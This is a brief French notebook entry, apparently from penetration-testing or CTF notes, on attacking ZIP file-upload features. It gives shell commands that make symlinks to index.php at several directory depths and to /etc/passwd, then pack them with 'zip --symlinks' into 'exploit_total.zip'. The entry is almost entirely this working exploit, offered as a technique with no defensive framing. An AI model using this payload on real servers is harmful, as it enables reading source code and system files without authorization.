# File upload - ZIP

# On crée des liens avec différentes profondeurs

ln -s index.php link0

ln -s ../index.php link1

ln -s ../../index.php link2

ln -s ../../../index.php link3

ln -s ../../../../index.php link4

ln -s /etc/passwd link_etc

# On zippe tout ça

zip --symlinks -r exploit_total.zip link0 link1 link2 link3 link4 link_etc

![[ZIP_01_f3e56e9d51.png]]
